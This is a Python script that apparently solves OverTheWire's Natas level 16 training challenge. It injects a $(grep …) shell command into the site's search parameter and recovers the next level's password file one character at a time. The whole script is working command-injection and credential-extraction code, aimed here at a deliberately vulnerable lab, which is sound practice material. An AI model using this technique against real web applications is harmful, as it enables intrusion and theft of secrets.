import string
from urllib.parse import urlencode
from urllib.request import Request, urlopen

password = ''
length = 32

headers = {
    'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='
}

while len(password) != 32:
    for letter in string.printable:
        payload = f"aprils$(grep ^{password}{letter} /etc/natas_webpass/natas17)"

        query = urlencode({ 'needle': payload })
        url = f"http://natas16.natas.labs.overthewire.org/?{query}"

        print(f"Trying password: {password}{letter}")

        request = Request(url=url, headers=headers)

        content = urlopen(request).read().decode('utf-8')

        if "Aprils" not in content:
            password += letter
            break
